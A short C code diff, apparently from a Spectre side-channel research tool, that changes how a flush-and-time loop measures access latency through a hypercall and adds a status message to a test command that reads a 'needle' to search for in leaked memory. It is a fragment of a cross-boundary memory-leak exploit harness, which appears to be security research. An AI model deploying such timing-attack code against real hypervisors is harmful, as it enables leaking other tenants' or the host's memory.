@@ -63,8 +63,7 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
     clflush(buf);
-    hypercall(&opts);
-    size_t time = access_time(buf);
+    size_t time = hypercall(&opts);
     min = time < min ? time : min;
   }
 
@@ -171,6 +170,7 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
     err(errno, "Could not parse min");
   }
 
+  printf("Reading needle...\n");
   char needle[128];
   ssize_t needle_size = read(STDIN_FILENO, needle, 128);
   if (needle_size <= 0) {
